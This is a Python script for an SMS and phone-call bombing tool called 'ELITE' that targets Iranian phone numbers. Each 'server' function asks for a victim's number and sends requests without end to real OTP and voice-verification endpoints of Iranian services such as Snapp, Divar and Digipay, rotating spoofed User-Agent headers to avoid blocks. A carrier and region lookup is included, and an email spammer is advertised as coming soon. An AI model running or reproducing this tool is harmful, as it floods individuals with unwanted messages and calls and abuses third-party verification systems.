import requests
import time
import random
import os
import time
import ELITE
import socket
import http.client as httplib
from phonenumbers import carrier
from phonenumbers import parse
from phonenumbers import geocoder
import datetime
import numpy

os.system('cls')

green = "\033[32m"
red = "\033[31m"
blue = "\033[36m"
pink = "\033[35m"
yellow = "\033[93m"
darkblue = "\033[34m" 
white = "\033[00m"

version = "V1.0.9"


print(F'{yellow}')
print(F'{white}'"")
os.system("cls")


print(F'{white}',"Inztaling ...")
os.system("cls")
os.system("pip install requests")
os.system("cls")
os.system("pip install phonenumbers")
os.system("cls")
os.system("pip install numpy")
os.system("cls")

print(" ")


now = datetime.datetime.now()
def about():
    print("                                                                     ")
    print(F'{darkblue}'"[+]"F'{white}'"==============================================================="F'{darkblue}'"[+]")
    print(F'{darkblue}'"   crated by : "F'{yellow}'"Dadmehr                              Copyright (C)")
    print("                                                                     ")
    print(F'{darkblue}'"   Construction time :"F'{white}'" Sep / 20 / 2022                               ")
    print(F'{darkblue}'"   Last Update : "F'{white}'"",(now.strftime("%a / %d / %Y")),"                  ")
    print("                                                                     ")
    print(F'{darkblue}'"   ID Telgram :"F'{white}'" red_ganr                                             ") 
    print(F'{darkblue}'"   Github : "F'{white}'" https://github.com/Dadmehr0                                                                   ")
    print("                                                                     ")
    print(F'{white}'"   ["F'{red}'"0"F'{white}'"]"F'{yellow}'" Back           "F'{white}'"["F'{yellow}'"Support for Iranian numbers"F'{white}'"]  ")
    print("                                                                     ")
    back = int(input("-> "))
    if back == 0:
        os.system('cls')
        print(F'{darkblue}') 
        banner()
    else:
        print(F'{red}')
        print('Error')
        time.sleep(1)
        banner()

def warning():
    print(F'{red}')
    print("                   Warning                ")
    print("==========================================")
    print(F'{white}'"Any misuse of this app is at your own risk")
    time.sleep(5.5)

heads1 = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept' : '*/*' 
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept': '*/*'
    },
]

heads2 = [
    {
        'User-Agent':'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
        'Accept' : '*/*'
    },
    {
        'User-Agent':'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*'
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*' 
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*' 
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*'
    },
    {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/105.0',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)',
        'Accept' : '*/*' 
    },
    { 
        'User-Agent' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1',
        'Accept' : '*/*' 
    },
    {
        'Mozilla/5.0' : '(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Accept' : '*/*'
    },
    {
        'Mozilla/5.0' : '(Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
        'Accept' : '*/*'
    },
]


# Servers

def servers():
    print(F'{darkblue}')
    print("                      Servers                                                         ")
    print(F'{white}'"[+]"F'{darkblue}'"==================================="F'{white}'"[+]")
    print("                                                                              ")
    print(F'{white}'"  ["F'{red}'"1"F'{white}'"]"F'{yellow}'" VIP Server                  ")
    print(F'{darkblue}'"  +===============+                                               ")
    print(F'{white}'"  ["F'{red}'"2"F'{white}'"]"F'{darkblue}'" ELITE Server              ")



def tip():
    print(F'{green}')
    print("                    tip                   ")
    print("==========================================")
    print(F'{white}'," You can purchase the special edition     ")
    print(F'{white}'," app to send more and perform better      ")
    time.sleep(7)
    os.system("cls")



def tip2():
    print(F'{green}')
    print("                    tip                   ")
    print("==========================================")
    print(F'{white}'," Every day of the week, the program       ")
    print(F'{white}'," is updated and posted on GitHub          ")
    print(F'{white}'," https://github.com/Dadmehr0              ")
    time.sleep(7)
    os.system("cls")
    

def tip3():
    
    print(F'{green}')
    print("                    tip                   ")
    print("==========================================")
    print(F'{white}'," If the transmission speed is not high,   ")
    print(F'{white}'," it means that your internet speed is weak")
    
    time.sleep(7)
    os.system("cls")


def tip5():
    print(F'{green}')
    print("                    tip                   ")
    print("==========================================")
    print(F'{white}'," [Errno 11001] = your intenet off ")
    time.sleep(7)
    os.system("cls")
rd = random.choice([tip,tip2,tip3,tip5])()
print(rd)
os.system("cls")



# VIP

def server_VIP1(): # snapp VIP
    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    json_snapp = {"cellphone":"+98"+number}
    

    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_heads_VIP1 = random.choice(heads2)

        req_VIP1 = requests.post(url=url_snapp,json=json_snapp,headers=random_heads_VIP1)
        print(req_VIP1,"Send",number,"<== VIP")

def server_VIP2(): # Divar VIP
    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_divar = "https://api.divar.ir/v5/auth/authenticate"
    json_divar = {"phone":number}


    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_heads_VIP2 = random.choice(heads2)

        req_VIP2 = requests.post(url=url_divar,json=json_divar,headers=random_heads_VIP2)
        print(req_VIP2,number,"<== VIP")
        print("Send")

def server_VIP3(): # VIP
    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_pezeshket = "https://api.pezeshket.com/core/v1/auth/requestCode"
    json_pezeshket = {"mobileNumber":number}


    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_heads_VIP3 = random.choice(heads2)

        req_VIP3 = requests.post(url=url_pezeshket,json=json_pezeshket,headers=random_heads_VIP3)
        print(req_VIP3,number,"<== VIP")
        print("Send")


def server_VIP4(): # VIP
    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_namava = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
    json_namava = {"UserName":"+98"+number}

    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_heads_VIP4 = random.choice(heads2)

        req_VIP4 = requests.post(url=url_namava,json=json_namava,headers=random_heads_VIP4)
        print(req_VIP4,number,"<== VIP")
        print("Send")

def server_VIP5(): # VIP
    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_Mary_sms = "https://api.behtarino.com/api/v1/businesses/mqdbicdbmb/vitrin_verification/"
    json_Mary_sms = {"phone":"0"+number,"resend":"true"}

    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_heads_VIP5 = random.choice(heads2)

        req_VIP5 = requests.post(url=url_Mary_sms,json=json_Mary_sms,headers=random_heads_VIP5)
        print(req_VIP5,number,"<== VIP")
        print("Send")

def server_VIP6(): # VIP
    print(F'{yellow}')
    number = input("VIP Target phone number +98 : ")
    os.system("cls")

    url_golastan = "https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth"
    json_golastan = {"phoneNumber":"0"+number}

    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_heads_VIP6 = random.choice(heads2)

        req_VIP6 = requests.post(url=url_golastan,json=json_golastan,headers=random_heads_VIP6)
        print(req_VIP6,number,"<== VIP")
        print("Send")

def server_VIP6(): # VIP
    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_shaypor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
    json_shaypor = {"username": number}

    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_heads_VIP6 = random.choice(heads2)

        req_VIP6 = requests.post(url=url_shaypor,json=json_shaypor,headers=random_heads_VIP6)
        print(req_VIP6,number,"<== VIP")
        print("Send")

def server_VIP7(): # VIP

    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_digipy = "https://app.mydigipay.com/digipay/api/users/send-sms"
    json_digipy = {"cellNumber":"0"+number,"device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}


    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_heads_VIP7 = random.choice(heads2)

        req_VIP7 = requests.post(url=url_digipy,json=json_digipy,headers=random_heads_VIP7)
        print(req_VIP7,number,"<== VIP")
        print("Send")

# ELITE



def server_ELITE1(): # all server ELITE
    e = ELITE.req_E(SEnd="")
    print(e)

def server_ELITE2():
    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_Mary_call = "https://api.behtarino.com/api/v1/users/phone_verification/call/"
    json_Mary_call = {"phone":"0"+number}


    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')

        random_heads_ELITE2 = random.choice(heads2)
        req_Server2_ELITE2 = requests.post(url=url_Mary_call,json=json_Mary_call,headers=random_heads_ELITE2)

        print(F'{yellow}')
        print(req_Server2_ELITE2,"Calling...")
        print("Wait...","20 Sec")
        time.sleep(20)


def server_ELITE3():

    print(F'{yellow}')
    number = input("Target phone number +98 : ")
    os.system("cls")

    url_irancart_call = 'https://api.iranicard.ir/api/v1/resend-register-otp-voice'
    json_irancart_call = {"mobile":"0"+number,"type":"register"}
    
    os.system("cls")
    print(F'{yellow}')
    while True:
        print(F'{green}')
        random_head = random.choice(heads1)
        req_Server3_ELITE3 = requests.post(url=url_irancart_call,json=json_irancart_call,headers=random_head)
        
        print(F'{yellow}')
        print(req_Server3_ELITE3,"Calling...")
        print("Wait...","20 Sec")
        time.sleep(20)



ip = requests.post("https://icanhazip.com").text

def banner():
    print(F'{darkblue}')
    print("                              "F'{darkblue}'"+=="F'{blue}'" ELITE"F'{darkblue}'" ==+ +== "F'{yellow}',version,F'{darkblue}',"==+                      ")
    print(F'{darkblue}'"[+]"F'{white}'"=========================================================="F'{darkblue}'"[+]                                              ")
    print("     By: Dadmehr             Your IP Address : "F'{yellow}'+ip,"                                                                            ")
    print(F'{white}',"["F'{red}'"1"F'{white}'"]"F'{darkblue}'" Enter"F'{white}'"  ["F'{red}'"4"F'{white}'"]"F'{darkblue}'" Number Details                        ")
    print(F'{white}',"["F'{red}'"2"F'{white}'"]"F'{darkblue}'" About"F'{white}'"  ["F'{red}'"5"F'{white}'"]"F'{darkblue}'" Email Spamer (Coming soon)            ")
    print(F'{white}',"["F'{red}'"3"F'{white}'"]"F'{darkblue}'" Exit                                                                                              ")
    print("")
    i = int(input("-> "))
    if i == 1:
        os.system("cls")
        servers()
        selector_server = int(input("-> "))
        if selector_server == 1:
            server_banner_VIP()
        elif selector_server == 2:
            server_banner_ELITE()            
    elif i == 2:
        os.system("cls")
        about()
    elif i == 3:
        print(F'{red}')
        os.system("cls")
        print(ok,"Good bye!")
        time.sleep(2)
    elif i == 4:
        os.system('cls')
        num_dtals()
    else:
        print(F'{red}')
        print(fail,"unavailable")
        time.sleep(1)
        os.system("cls")
        banner()


#def timer():
#    print("1",time.sleep(1.5),"2",time.sleep(1.5),"3",time.sleep(1.5))


def server_banner_VIP():
    os.system("cls")
    print(F'{blue}')
    print("<== VIPs ==>")

    print(F'{green}')
    print("1) Server1 | 90%")

    print(F'{white}')
    print("+=================+")

    print(F'{green}')
    print("2) Server2 | 80%")

    print(F'{white}')
    print("+=================+")

    print(F'{green}')
    print("3) Server3 | 70%")

    print(F'{white}')
    print("+=================+")

    print(F'{green}')
    print("4) Server4 | 90%")

    print(F'{white}')
    print("+=================+")

    print(F'{green}')
    print("5) Server5 | 70%")

    print(F'{white}')
    print("+=================+")

    print(F'{green}')
    print("6) Server6 | 100%")

    print(F'{white}')
    print("+=================+")

    print(F'{green}')
    print("7) Server7 | 70%")

    print(F'{yellow}')
    select_VIP = int(input("[VIP] Select Server ->"))
    if select_VIP == 1:
        server_VIP1()
    elif select_VIP == 2:
        server_VIP2()
    elif select_VIP == 3:
        server_VIP3()
    elif select_VIP == 4:
        server_VIP4()
    elif select_VIP == 5:
        server_VIP5()
    elif select_VIP == 6:
        server_VIP6()
    elif select_VIP == 7:
        server_VIP7()
    else:
        print(F'{red}')
        print("ERROR")
        banner()

def server_banner_ELITE():
    os.system("cls")

    print(F'{yellow}')
    print("<== ELITEs ==>")

    print(F'{blue}')
    print("1) Server1 | 100%")

    print(F'{white}')
    print("+=================+")
    print("Call Spamer server")
    print(F'{blue}')
    print("2) Server2 | 80%")
    print(F'{blue}')
    print("3) Server3 | 90%")

    print(F'{blue}')
    select_ELITE = int(input("[ELITE] Select Server ->"))
    if select_ELITE == 1:
        server_ELITE1()
    elif select_ELITE == 2:
        server_ELITE2()
    elif select_ELITE == 3:
        server_ELITE3()
    else:
        print(F'{red}')
        print("ERROR")
        banner()

# num dtails def 
def num_dtals():
    print(F'{yellow}'"[*]"F'{white}'" Mobile number with country code")
    print(F'{yellow}'"[*]"F'{white}'" Example : +981234567889")
    print(F'{darkblue}')

    phone_sim_data = input("Enter Phone number : ")
    number_d = parse(phone_sim_data)

    print(F'{darkblue}')
    print(geocoder.description_for_number(number_d,'en'))
    print(carrier.name_for_number(number_d,"en"))
    print("+================+")
    print(' [0] Back')
    print(' [1] Exit')
    exit_num = input('->')
    if exit_num == 0:
        os.system('cls')
        banner()
    elif exit_num == 1:
        os.system('cls')
        print('Good bye!')
        time.sleep(1)
    else:
        time.sleep(1)
        os.system('cls')
        banner()

warning()
os.system("cls")
def checkInternetHttplib(url="www.google.com",timeout=3):
    connection = httplib.HTTPConnection(url,timeout=timeout)
    try:
        # only header requested for fast operation
        connection.request("HEAD", "/")
        connection.close()  # connection closed
        print(F'{green}')
        print(F'{darkblue}'" [+ "F'{green}'"Internet On "F'{darkblue}'"+]")
        return True
    except Exception as exep:
        print(exep)
        return False
internet = checkInternetHttplib("www.google.com", 3)
banner()
os.system("cls")
